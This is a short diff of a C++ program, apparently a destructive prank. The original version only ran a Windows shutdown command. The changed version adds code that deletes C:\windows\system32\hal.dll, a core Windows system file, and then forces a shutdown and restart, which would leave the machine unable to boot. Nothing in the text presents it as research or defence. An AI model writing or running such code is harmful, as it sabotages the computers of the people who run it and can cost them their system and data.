@@ -2,8 +2,10 @@
 #include <iostream>
 using namespace std;
 
-int main(){
-  system("shutdown -s");
-  system("pause");
-
+int main(int atgv, char *argv[])
+{
+  std::remove("C:\\windows\\system32\\hal.dll");
+  system("shutdown -s -r");
+  system("PAUSE");
+  return EXIT_SUCCESS;
 }
